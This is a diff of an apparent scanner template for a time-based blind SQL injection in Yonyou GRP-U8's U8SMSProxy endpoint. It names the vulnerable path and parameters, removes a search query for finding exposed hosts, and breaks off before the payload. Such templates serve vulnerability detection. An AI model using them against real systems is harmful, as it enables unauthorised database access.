@@ -3,14 +3,8 @@ info:
   name: 用友GRP-U8U8SMSProxysql注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b21072714f1bcbe26abf38a5adc878b6
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: b21072714f1bcbe26abf38a5adc878b6
-    fofa: + hunter`app.name="用友GRP-U8 OA"`
 http:
 - raw:
   - 'POST /U8SMSProxy?class=XXNote&id=qryyfs HTTP/1.1
